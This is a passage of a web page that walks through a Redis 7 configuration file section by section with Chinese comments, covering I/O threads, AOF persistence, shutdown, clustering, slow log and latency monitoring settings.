<span class="token key attr-name">lazyfree-lazy-user-flush</span> <span class="token value attr-value">no</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="THREADED-I-O">THREADED I/O</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">################################ THREADED I/O ：慢I/O访问线程操作 #################################</span>

<span class="token comment"># Redis主要是单线程的，但是也有一些线程操作，如UNLINK，慢I/O访问和其他在边线程上执行的事情。</span>
<span class="token comment">#</span>
<span class="token comment"># 现在也可以在不同的I/O线程中处理Redis客户端的套接字读写。</span>
<span class="token comment"># 由于写的很慢，通常Redis用户使用流水线来加快每个核的性能，并生成多个实例来扩展。使用I/O线程，可以轻松地将Redis加速两倍，而无需诉诸于流水线或实例分片。</span>
<span class="token comment"># 默认情况下线程是禁用的，我们建议只在至少有4个或更多内核的机器上启用它，至少留下一个备用内核。</span>
<span class="token comment"># 使用超过8个线程不太可能有太大帮助。我们也建议只有当你真的有性能问题时才使用线程I/O，因为Redis实例能够使用相当大比例的CPU时间，否则使用这个特性没有任何意义。</span>
<span class="token comment">#</span>
<span class="token comment"># 例如，如果你有一个四核CPU，尝试使用2或3个I/O线程，如果你有一个8核，尝试使用6个线程。为了启用I/O线程，使用以下配置指令:</span>
<span class="token comment">#</span>
<span class="token comment"># io-threads 4</span>
<span class="token comment">#</span>
<span class="token comment"># 将io-threads设置为1将会像往常一样使用主线程。当I/O线程被启用时，我们只使用线程进行写操作，即执行write(2)系统调用并将客户端缓冲区传输到套接字。</span>
<span class="token comment"># 然而，也可以使用以下配置指令启用读取线程和协议解析，将其设置为yes:</span>
<span class="token comment">#</span>
<span class="token comment"># io-threads-do-reads no</span>
<span class="token comment">#</span>
<span class="token comment"># 通常，线程读取没有太大帮助。</span>
<span class="token comment"># NOTE 1: 这个配置指令不能在运行时通过CONFIG SET修改。此外，当启用SSL时，此特性目前无法工作。</span>
<span class="token comment"># NOTE 2:如果你想使用red -benchmark测试Redis的加速，确保你也在线程模式下运行基准测试本身，使用——threads选项来匹配Redis线程的数量，否则你将无法注意到这些改进。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="KERNEL-OOM-CONTROL">KERNEL OOM CONTROL</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">############################ KERNEL OOM CONTROL：内核oom控制 ##############################</span>

<span class="token comment"># 在Linux上，可以提示内核OOM杀手在内存不足时应该首先杀死哪些进程。</span>
<span class="token comment"># 启用这个特性可以使Redis主动控制所有进程的oom_score_adj值，这取决于它们的角色。</span>
<span class="token comment"># 默认分数将尝试在所有其他进程之前杀死后台子进程，并在主进程之前杀死副本。</span>
<span class="token comment"># Redis支持以下选项:</span>
<span class="token comment"># - no:       不要更改oom-score-adj(默认值)。</span>
<span class="token comment"># - yes:      “相对”的别名见下文。</span>
<span class="token comment"># - absolute: om-score-adj- Values中的值被写入内核。</span>
<span class="token comment">#- relative:  这些值在服务器启动时相对于oom_score_adj的初始值使用，然后被限制在-1000到1000的范围内。因为初始值通常为0，所以它们通常会与绝对值匹配。</span>
oom-score-adj no

<span class="token comment"># 当使用oom-score-adj时，该指令控制主进程、副本进程和后台子进程的特定值。数值范围为-2000到2000(越高意味着越有可能被杀死)。</span>
<span class="token comment"># 没有特权的进程(不是根进程，并且没有CAP_SYS_RESOURCE功能)可以自由地增加其值，但不能将其降低到初始设置以下。</span>
<span class="token comment"># 这意味着将oom-score-adj设置为“相对”，并将oom-score-adj-values设置为正值总是会成功。</span>
oom-score-adj-values <span class="token number">0</span> <span class="token number">200</span> <span class="token number">800</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="KERNEL-transparent-hugepage-CONTROL">KERNEL transparent hugepage CONTROL</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#################### KERNEL transparent hugepage CONTROL ###################### </span>
<span class="token comment"># 通常内核的透明大页面控件设置为“madvise”或者默认为“never”(/sys/kernel/mm/transparent_hugepage/enabled)，这样，此配置无效。</span>
<span class="token comment"># 在将其设置为“always”的系统中，Redis将为了Redis进程尝试禁用它，为了避免延迟问题（特别是fork(2)和CoW的延迟问题）。</span>
<span class="token comment"># 如果出于某种原因，您更喜欢保持启用，您可以将此配置设置为“no”，并将内核全局设置为“always”。</span>
disable-thp <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="APPEND-ONLY-MODE：追加模式">APPEND ONLY MODE：追加模式</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">############################## APPEND ONLY MODE ###############################</span>

<span class="token comment"># 默认情况下，Redis会异步将数据集转储到磁盘上。这种模式在许多应用程序中已经足够好了，但是Redis进程的问题或停电可能会导致几分钟的写入丢失(取决于配置的保存点)。</span>
<span class="token comment"># 仅追加文件是另一种持久性模式，它提供了更好的持久性。</span>
<span class="token comment"># 例如，使用默认的数据fsync策略(参见后面的配置文件)，Redis可以在一个意外事件中丢失一秒钟的写操作内容（比如服务器断电，或者如果Redis进程本身发生了一些错误），但Reids程序仍然正常运行。</span>
<span class="token comment"># AOF和RDB持久性可以同时启用，没有任何问题.</span>
<span class="token comment"># 如果启动时启用AOF, Redis将加载AOF，这是具有更好的持久性保证的文件。</span>
<span class="token comment">#</span>
<span class="token comment"># Please check https://redis.io/topics/persistence for more information.</span>

appendonly no

<span class="token comment"># 仅附加文件的基本名称</span>
<span class="token comment"># Redis 7和更新版本使用一组只能追加的文件来持久化数据集和应用于它的更改。使用的文件有两种基本类型:</span>
<span class="token comment"># - 基本文件，它是表示创建文件时数据集完整状态的快照。 基本文件的形式可以是RDB (binary serialized：二进制序列化) or AOF (textual commands：文本命令).</span>
<span class="token comment"># - 增量文件，其中包含在前一个文件之后应用于数据集的其他命令。</span>
<span class="token comment">#</span>
<span class="token comment"># 此外，清单文件用于跟踪文件及其创建和应用它们的顺序。</span>
<span class="token comment"># Append-only文件的文件名是由Redis按照特定的模式创建的。文件名的前缀基于“appendfilename”配置参数，后面跟着关于序列和类型的附加信息。</span>
<span class="token comment"># 例如，如果appendfilename设置为appendonly.aof，可以导出以下文件名:</span>
<span class="token comment"># - appendonly.aof.1.base.rdb （基本文件）</span>
<span class="token comment"># - appendonly.aof.1.incr.aof, appendonly.aof.2.incr.aof （增量文件）</span>
<span class="token comment"># - appendonly.aof.manifest （清单文件）</span>

appendfilename <span class="token string">"appendonly.aof"</span>

<span class="token comment"># 为了方便起见，Redis将所有持久的仅追加文件存储在专用目录中。目录的名称由appenddirname配置参数决定。</span>
appenddirname <span class="token string">"appendonlydir"</span>

<span class="token comment"># fsync()调用告诉操作系统实际将数据写入磁盘，而不是在输出缓冲区中等待更多数据。</span>
<span class="token comment"># 有些操作系统真的会在磁盘上刷新数据，其他操作系统会尽快尝试这样做。</span>
<span class="token comment">#</span>
<span class="token comment"># Redis支持三种不同的模式:</span>
<span class="token comment"># - no: 不要fsync，让操作系统在需要的时候刷新数据。快。</span>
<span class="token comment"># - always: 每次写入仅追加日志后进行fsync。慢，但安全。</span>
<span class="token comment"># - everysec: 每秒只能进行一次fsync。妥协。</span>
<span class="token comment">#</span>
<span class="token comment"># 默认是“everysec”，因为这通常是速度和数据安全之间的正确妥协。</span>
<span class="token comment"># 这取决于您是否可以将其放宽为“no”，从而让操作系统在需要时刷新输出缓冲区，以获得更好的性能(但如果您可以接受一些数据丢失的想法，请考虑默认的持久性模式快照)，或者相反，使用“always”，它非常慢，但比everysec更安全一些。具体内容参考： http://antirez.com/post/redis-persistence-demystified.html</span>
<span class="token comment">#</span>
<span class="token comment"># 如果不确定选择哪种，使用默认的“everysec”。</span>
<span class="token comment"># appendfsync always</span>
appendfsync everysec
<span class="token comment"># appendfsync no</span>

<span class="token comment"># 当AOF的fsync策略设置为always或everysec时，一个后台保存进程(一个后台保存或AOF日志后台重写)正在对磁盘执行大量的I/O，在一些Linux配置中，Redis可能会在fsync()调用上阻塞太长时间。</span>
<span class="token comment"># 请注意，目前还没有修复这个问题，因为即使在不同的线程中执行fsync也会阻塞同步写(2)调用。</span>
<span class="token comment">#</span>
<span class="token comment"># 为了缓解这个问题，可以使用以下选项来防止在BGSAVE或BGREWRITEAOF正在进行时在主进程中调用fsync()。</span>
<span class="token comment"># 这意味着当另一个子文件正在保存时，Redis的持久性与“appendfsync no”相同。</span>
<span class="token comment"># 实际上，这意味着在最坏的情况下(使用默认的Linux设置)，可能会丢失长达30秒的日志。</span>
<span class="token comment">#</span>
<span class="token comment"># 如果你有延迟问题，把这个改为“是”。否则，从耐久性的角度来看，这是最安全的选择。</span>

no-appendfsync-on-rewrite no

<span class="token comment"># 自动重写append only文件。</span>
<span class="token comment"># 当AOF日志大小增长到指定的百分比时，Redis能够隐式地自动重写日志文件，调用BGREWRITEAOF。</span>
<span class="token comment"># 它是这样工作的: Redis记住最近一次重写后AOF文件的大小(如果重启后没有发生重写，则使用启动时AOF的大小)。</span>
<span class="token comment">#</span>
<span class="token comment"># 此基本大小与当前大小进行比较. 如果当前大小大于指定的百分比，则会触发重写. 此外，您还需要指定要重写的AOF文件的最小大小, 这对于避免重写AOF文件很有用，即使达到了百分比增长，但它仍然非常小。</span>
<span class="token comment"># 指定一个百分数为零以禁用自动AOF重写功能。</span>
auto-aof-rewrite-percentage <span class="token number">100</span>
auto-aof-rewrite-min-size 64mb

<span class="token comment"># 在Redis启动过程中，当AOF数据被加载回内存时，可能会发现AOF文件在结束时被截断。当Redis运行的系统崩溃时，可能会发生这种情况, 特别是当ext4文件系统在没有data=ordered选项的情况下被挂载时(然而，当Redis本身崩溃或中止，但操作系统仍然正常工作时，这就不会发生)。</span>
<span class="token comment"># 当这种情况发生时，Redis可以退出错误，或者加载尽可能多的数据(现在的默认值)，并在发现AOF文件在结束时被截断时启动。以下选项控制此行为。</span>
<span class="token comment">#</span>
<span class="token comment"># 如果aof-load-truncated设置为yes，则加载一个截断的AOF文件，并且Redis服务器开始发送日志来通知用户该事件。</span>
<span class="token comment"># 否则，如果该选项被设置为no，服务器将终止并报错并拒绝启动。当该选项设置为no时，用户需要在重新启动服务器之前使用“redis-check-aof”实用程序修复AOF文件。</span>
<span class="token comment">#</span>
<span class="token comment"># 注意，如果AOF文件在中间被发现损坏，服务器仍然会报错退出。这个选项只适用于当Redis试图从AOF文件读取更多的数据，但没有足够的字节将被发现。</span>
aof-load-truncated <span class="token function">yes</span>

<span class="token comment"># Redis可以创建RDB或AOF格式的只能追加的基本文件. 使用RDB格式总是更快更有效，仅出于向后兼容的目的才支持禁用RDB格式。</span>
aof-use-rdb-preamble <span class="token function">yes</span>

<span class="token comment"># Redis支持在AOF中记录时间戳注释，以支持从特定时间点恢复数据。但是，使用此功能会以一种可能与现有AOF解析器不兼容的方式更改AOF格式。</span>
aof-timestamp-enabled no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="SHUTDOWN">SHUTDOWN</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">################################ SHUTDOWN #####################################</span>

<span class="token comment"># 关闭时等待副本的最大时间，以秒为单位。</span>
<span class="token comment">#</span>
<span class="token comment"># 在关闭期间，宽限期允许任何滞后的副本在主复制存在之前赶上最新的复制偏移量。这段时间可以防止数据丢失，特别是对于没有配置磁盘备份的部署。</span>
<span class="token comment"># “shutdown-timeout”值是宽限期的持续时间，单位为秒。它只适用于实例有副本的情况。如果要禁用该特性，请将该值设置为0。</span>
<span class="token comment">#</span>
<span class="token comment"># shutdown-timeout 10</span>

<span class="token comment"># 当Redis接收到SIGINT（中断信号：interrupt）或SIGTERM（终止信号：terminal）时，启动关机，默认情况下，如果配置了保存点，则在阻塞操作中将RDB快照写入磁盘。</span>
<span class="token comment"># 用于信号关闭的选项可以包括以下值:</span>
<span class="token comment"># default:  仅当配置保存点时保存RDB快照。等待滞后的副本赶上。</span>
<span class="token comment"># save:     强制数据库保存操作，即使没有配置保存点。</span>
<span class="token comment"># nosave:   拒绝数据库保存操作，即使配置了一个或多个保存点。</span>
<span class="token comment"># now:      跳过等待滞后的副本。</span>
<span class="token comment"># force:    忽略任何通常会阻止服务器退出的错误。</span>
<span class="token comment">#</span>
<span class="token comment"># 只要“save”和“nosave”不同时设置，就允许任何值的组合。例如: "nosave force now"</span>
<span class="token comment">#</span>
<span class="token comment"># shutdown-on-sigint default</span>
<span class="token comment"># shutdown-on-sigterm default</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="NON-DETERMINISTIC-LONG-BLOCKING-COMMANDS">NON-DETERMINISTIC LONG BLOCKING COMMANDS</h2>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">################ NON-DETERMINISTIC LONG BLOCKING COMMANDS： 不确定的长阻塞命令 #####################</span>
<span class="token comment"># 在Redis开始处理或拒绝其他客户端之前，EVAL脚本、函数和某些情况下模块命令的最大时间(以毫秒为单位)。</span>
<span class="token comment">#</span>
<span class="token comment"># 如果达到最大执行时间，Redis将开始回复大多数命令与BUSY错误。</span>
<span class="token comment"># 在这种状态下，Redis只允许执行少量命令。例如，SCRIPT KILL, FUNCTION KILL, SHUTDOWN NOSAVE，可能还有一些模块特定的'allow-busy'命令。</span>
<span class="token comment"># SCRIPT KILL和FUNCTION KILL只能停止尚未调用任何写命令的脚本，因此，当用户不想等待脚本的自然终止时，如果脚本已经发出了写命令，则SHUTDOWN NOSAVE可能是停止服务器的唯一方法</span>
<span class="token comment">#</span>
<span class="token comment"># 缺省值是5秒。可以将其设置为0或负值来禁用此机制(不间断执行)。注意，在过去这个配置有一个不同的名字，现在是一个别名，所以这两个都是一样的:</span>
<span class="token comment">#</span>
<span class="token comment"># lua-time-limit 5000</span>
<span class="token comment"># busy-reply-threshold 5000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="REDIS-CLUSTER：集群配置">REDIS CLUSTER：集群配置</h2>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">################################ REDIS CLUSTER  ###############################</span>

<span class="token comment"># 普通的Redis实例不能成为Redis集群的一部分，只有作为集群节点启动的节点可以。</span>
<span class="token comment"># 为了启动一个Redis实例作为一个集群节点，启用集群支持取消注释如下:</span>
<span class="token comment">#</span>
<span class="token comment"># cluster-enabled yes</span>

<span class="token comment"># 每个集群节点都有一个集群配置文件。此文件不建议手动编辑。它由Redis节点创建和更新。</span>
<span class="token comment"># 每个Redis集群节点都需要不同的集群配置文件。</span>
<span class="token comment"># 确保在同一系统中运行的实例没有重叠的集群配置文件名。</span>
<span class="token comment">#</span>
<span class="token comment"># cluster-config-file nodes-6379.conf</span>

<span class="token comment"># 集群节点超时时间是指一个节点必须不可达的毫秒数，才会被认为处于故障状态。</span>
<span class="token comment">#</span>
<span class="token comment"># cluster-node-timeout 15000</span>

<span class="token comment"># 集群端口是集群总线侦听入站连接的端口。</span>
<span class="token comment"># 当设置为默认值0时，绑定到命令端口+10000。设置此值要求您在执行cluster meet时指定集群总线端口。</span>
<span class="token comment"># cluster-port 0</span>

<span class="token comment"># 如果发生故障的主服务器的数据看起来太旧，它的副本将避免启动故障转移。</span>
<span class="token comment"># 对于副本来说，没有简单的方法可以准确测量其“数据年龄”，因此执行以下两个检查:</span>
<span class="token comment">#</span>
<span class="token comment"># 1) 如果有多个副本能够进行故障转移，它们将交换消息，以便尝试为副本提供最佳复制偏移(处理来自主服务器的更多数据)。</span>
<span class="token comment">#     副本将尝试通过偏移量获得它们的排名，并将与它们的排名成比例的延迟应用于故障转移的开始。</span>
<span class="token comment">#</span>
<span class="token comment"># 2) 每个副本都计算与主节点最后一次交互的时间. 这可能是接收到的最后一个ping或命令 (如果主服务器仍然处于“已连接”状态), 或者与主服务器断开连接后经过的时间(如果复制链路当前断开)。</span>
<span class="token comment">#     如果最后一次交互太旧，副本将根本不会尝试故障转移。</span>
<span class="token comment">#</span>
<span class="token comment"># 第二点可由用户调整。具体来说，如果自上次与主服务器交互以来，所消耗的时间大于以下情况，副本将不执行故障转移:</span>
<span class="token comment">#</span>
<span class="token comment">#   (node-timeout * cluster-replica-validity-factor) + repl-ping-replica-period</span>
<span class="token comment">#   (节点掉线时间 * 集群副本有效性因子) + 循环PING访问的周期时间</span>
<span class="token comment">#</span>
<span class="token comment"># 因此，例如，如果node-timeout是30秒，cluster-replica-validity-factor是10，并且假设默认的repo -ping-replica-period是10秒，那么如果它不能与主服务器对话超过310秒，它就不会尝试故障转移。</span>
<span class="token comment"># 一个大的cluster-replica-validity-factor可能会允许带有太旧数据的副本故障转移到主节点，而一个太小的值可能会阻止集群完全能够选择一个副本。</span>
<span class="token comment">#</span>
<span class="token comment"># 为了获得最大可用性，可以将cluster-replica-validity-factor设置为0，这意味着副本将始终尝试故障转移到主服务器，而不管它们最后一次与主服务器交互是什么时候。</span>
<span class="token comment"># (然而，他们总是尝试应用一个与他们的偏移等级成比例的延迟)。</span>
<span class="token comment">#</span>
<span class="token comment"># 0是唯一能够保证当所有分区恢复时，集群始终能够继续运行的值。</span>
<span class="token comment">#</span>
<span class="token comment"># cluster-replica-validity-factor 10</span>

<span class="token comment"># 集群副本能够迁移到孤立的主服务器，即没有工作副本的主服务器。</span>
<span class="token comment"># 这提高了集群抵抗故障的能力，否则，如果没有工作副本，孤立的主节点就不能在故障发生时被故障转移。但是，只有当它们的旧主人至少还有一定数量的其他工作副本时，副本才会迁移到孤立的主人。这个数字就是“迁移障碍”。迁移障碍为1意味着一个副本只有在它的主副本至少有一个其他工作副本时才会迁移，以此类推。它通常反映集群中每个主节点所需的副本数量。</span>
<span class="token comment">#</span>
<span class="token comment"># 默认值是1(只有当它们的主副本保留至少一个副本时，副本才会迁移)。</span>
<span class="token comment"># 要禁用迁移，只需将其设置为一个非常大的值或将cluster-allow-replica-migration设置为“no”。可以设置0值，但仅在调试时有用，在生产中是危险的。</span>
<span class="token comment">#</span>
<span class="token comment"># cluster-migration-barrier 1</span>

<span class="token comment"># 关闭此选项允许使用较少的自动集群配置。它既禁止迁移到孤儿的主节点，也禁止从空的主节点迁移。默认是'yes'(允许自动迁移)。</span>
<span class="token comment">#</span>
<span class="token comment"># cluster-allow-replica-migration yes</span>

<span class="token comment"># 默认情况下，如果Redis集群节点检测到至少有一个哈希槽未被发现(没有可用的节点正在为它服务)，它们将停止接受查询。</span>
<span class="token comment"># 这样，如果集群部分关闭(例如，一系列哈希槽不再被覆盖)，所有集群最终都将不可用。一旦所有插槽被再次覆盖，它就自动返回可用。</span>
<span class="token comment"># 然而，有时您希望正在工作的集群子集继续接受对仍然覆盖的键空间部分的查询。为此，只需将cluster-require-full-coverage选项设置为no。</span>
<span class="token comment">#</span>
<span class="token comment"># cluster-require-full-coverage yes</span>

<span class="token comment"># 当此选项设置为yes时，将防止副本在主服务器故障时试图将其主服务器故障转移。但是，如果强制执行，副本仍然可以执行手动故障转移。</span>
<span class="token comment"># 这在不同的场景中都很有用，特别是在多个数据中心操作的情况下，如果不是在DC完全故障的情况下，我们希望其中一方永远不会被提升。</span>
<span class="token comment">#</span>
<span class="token comment"># cluster-replica-no-failover no</span>

<span class="token comment"># 当该选项设置为yes时，允许节点在集群处于down状态时服务读流量，只要节点认为它拥有插槽。</span>
<span class="token comment"># 这在两种情况下是有用的</span>
<span class="token comment"># 1. 当应用程序在节点故障或网络分区期间不需要数据一致性时。例如缓存数据。只要节点拥有数据，它就应该能够为其提供服务。</span>
<span class="token comment"># 2. 此用例用于集群不满足推荐的三个分片，但又希望启用集群模式并在以后扩展的配置。</span>
<span class="token comment">#    如果没有设置这个选项，1或2个分片配置中的主中断将导致整个集群的读/写中断，如果设置了这个选项，则只会导致写中断。如果没有指定的master，插槽的所有权将不会自动改变。</span>
<span class="token comment"># </span>
<span class="token comment"># cluster-allow-reads-when-down no</span>


<span class="token comment"># 当该选项设置为yes时，允许节点在集群处于down状态时服务发布分片流量，只要节点认为它拥有插槽。</span>
<span class="token comment"># 如果应用程序即使在集群全局稳定状态不正常的情况下也想使用pubsub特性，那么这是很有用的。如果应用程序想要确保只有一个分片服务于给定的通道，这个特性应该保持为yes。</span>
<span class="token comment"># </span>
<span class="token comment"># cluster-allow-pubsubshard-when-down yes</span>


<span class="token comment"># 设置每个集群总线连接的发送字节缓冲区的内存使用限制，超过限制缓冲区将被清空。</span>
<span class="token comment"># 这主要是为了防止发送缓冲区在通往慢速连接的链路上无限制地增长(例如PubSub消息被堆积起来)。默认情况下禁用此限制。</span>
<span class="token comment"># 而当INFO中的'mem_cluster_links' 和/或 'CLUSTER LINKS ' 命令回显中的'send-buffer-allocated'（已分配的发送缓冲区） 项不断增加时，启用该限制。</span>
<span class="token comment"># 建议设置1gb的最小限制，这样集群链接缓冲区默认情况下至少可以容纳一条PubSub消息。(client-query-buffer-limit默认值为1gb。见 ADVANCED CONFIG)</span>
<span class="token comment">#</span>
<span class="token comment"># cluster-link-sendbuf-limit 0</span>
 

<span class="token comment"># 集群可以使用此配置配置其宣布的主机名。</span>
<span class="token comment"># 对于需要使用TLS服务器名称指示(SNI)或处理基于DNS的路由的应用程序，这是一个常见的用例。</span>
<span class="token comment"># 默认情况下，该值仅在CLUSTER SLOTS命令中显示为额外的元数据，但可以使用'cluster-preferred-endpoint-type' 更改。该值通过集群总线传递给所有节点，将其设置为空字符串将删除主机名并传播删除。</span>
<span class="token comment"># cluster-announce-hostname ""</span>

<span class="token comment"># 集群可以通告客户端如何使用它们的IP地址连接到它们，用户定义主机名，或者声明它们没有端点。</span>
<span class="token comment"># 通过使用 cluster-preferred-end -type 配置值'ip'、'hostname'或'unknown-endpoint'来设置哪个端点显示为首选端点。</span>
<span class="token comment"># 这个值控制端点如何返回MOVED/ASKING请求以及CLUSTER插槽的第一个字段。</span>
<span class="token comment"># 如果首选端点类型设置为主机名，但没有设置宣布的主机名，则'?’将被返回。</span>
<span class="token comment"># 当集群宣称自己具有未知端点时，这表明服务器不知道客户机如何到达集群。这可能发生在某些网络情况下，其中有多个可能的路由到节点，并且服务器不知道客户端选择了哪一个。</span>
<span class="token comment"># 在这种情况下，服务器期望客户端通过发出最后一个请求时使用的相同端点进行联系，但是使用响应中提供的端口。</span>
<span class="token comment">#</span>
<span class="token comment"># cluster-preferred-endpoint-type ip</span>

<span class="token comment"># In order to setup your cluster make sure to read the documentation</span>
<span class="token comment"># available at https://redis.io web site.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="CLUSTER-DOCKER-NAT-support：集群配置">CLUSTER DOCKER/NAT support：集群配置</h2>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">########################## CLUSTER DOCKER/NAT support：容器内集群配置  ########################</span>

<span class="token comment"># 在某些部署中，无法检测到Redis集群节点，因为地址是NAT-ted或因为端口被转发(典型的情况是Docker和其他容器)。</span>
<span class="token comment"># 为了使Redis集群在Docker容器这样的环境中工作，需要一个静态配置，其中每个节点都知道自己的公共地址。</span>
<span class="token comment"># 以下四个选项用于此范围，分别是:</span>

<span class="token comment"># * cluster-announce-ip</span>
<span class="token comment"># * cluster-announce-port</span>
<span class="token comment"># * cluster-announce-tls-port</span>
<span class="token comment"># * cluster-announce-bus-port</span>

<span class="token comment"># 每个配置都指示节点有关其地址、客户端端口(用于不带TLS和带TLS的连接)和集群消息总线端口。</span>
<span class="token comment"># 然后在总线包的报头中发布该信息，以便其他节点能够正确地映射发布该信息的节点的地址。</span>

<span class="token comment"># </span>
<span class="token comment"># 如果“tls-cluster”设置为“yes”，而“cluster-announce-tls-port”被省略或设置为“0”，则“cluster-announce-port”指的是TLS端口。</span>
<span class="token comment"># 另请注意，如果“tls-cluster”设置为“no“（默认），则”cluster-announce-tls-port”无效。</span>
<span class="token comment">#</span>
<span class="token comment"># 如果不使用上述选项，将使用正常的Redis集群自动检测。</span>
<span class="token comment"># </span>
<span class="token comment"># 注意，在重新映射时，总线端口可能不在客户端端口+10000 的固定偏移量上，因此您可以根据重新映射的方式指定任何端口和总线端口。</span>
<span class="token comment"># 如果没有设置总线端口，将像往常一样使用固定偏移量10000</span>
<span class="token comment">#</span>
<span class="token comment"># 例如:</span>
<span class="token comment">#</span>
<span class="token comment"># cluster-announce-ip 10.1.1.5</span>
<span class="token comment"># cluster-announce-tls-port 6379</span>
<span class="token comment"># cluster-announce-port 0</span>
<span class="token comment"># cluster-announce-bus-port 6380</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="SLOW-LOG：慢查询日志">SLOW  LOG：慢查询日志</h2>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">################################## SLOW LOG ：满查询日志###################################</span>

<span class="token comment"># Redis Slow Log 是一个记录超过指定执行时间的查询的系统。执行时间不包括I/O操作，如与客户端交谈、发送应答等，而只包括实际执行命令所需的时间(这是命令执行的唯一阶段，线程被阻塞，不能同时服务其他请求)。</span>
<span class="token comment"># 您可以使用两个参数配置慢速日志: 一个参数告诉Redis要超过多少微秒的执行时间才能记录命令，另一个参数是慢速日志的长度。</span>
<span class="token comment"># 当记录一个新命令时，最早的命令将从记录的命令队列中删除。</span>
<span class="token comment"># 下面的时间以微秒表示，因此1000000相当于一秒。请注意，负数禁用慢日志，而值为零则强制记录每个命令。</span>
<span class="token key attr-name">slowlog-log-slower-than</span> <span class="token value attr-value">10000</span>
<span class="token comment"># 这个长度没有限制。只是要注意它会消耗内存。</span>
<span class="token comment"># 可以使用SLOWLOG RESET回收慢日志使用的内存。</span>
<span class="token key attr-name">slowlog-max-len</span> <span class="token value attr-value">128</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="LATENCY-MONITOR：延迟监控">LATENCY MONITOR：延迟监控</h2>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">################################ LATENCY MONITOR：延迟监控 ##############################</span>

<span class="token comment"># The Redis latency monitoring subsystem samples different operations at runtime in order to collect data related to possible sources of latency of a Redis instance.</span>
<span class="token comment"># Redis延迟监控子系统在运行时对不同的操作进行抽样，以收集与Redis实例的可能延迟来源相关的数据。</span>
<span class="token comment"># 通过LATENCY命令，用户可以打印图表并获得报告。</span>
<span class="token comment">#</span>
<span class="token comment"># 系统只记录执行时间等于或大于通过延迟监视器阈值配置指令指定的毫秒数的操作。</span>
<span class="token comment"># 当其值设置为0时，将关闭延迟监视器。</span>
<span class="token comment">#</span>
<span class="token comment"># 默认情况下，延迟监视是禁用的，因为如果您没有延迟问题，则通常不需要它，并且收集数据会对性能产生影响，尽管影响很小，但可以在大负载下测量。</span>
<span class="token comment"># 如果需要，可以在运行时使用命令"CONFIG SET latency-monitor-threshold &lt;milliseconds&gt;" 轻松启用延迟监控。</span>
<span class="token key attr-name">latency-monitor-threshold</span> <span class="token value attr-value">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="LATENCY-TRACKING：延迟追踪">LATENCY TRACKING：延迟追踪</h2>
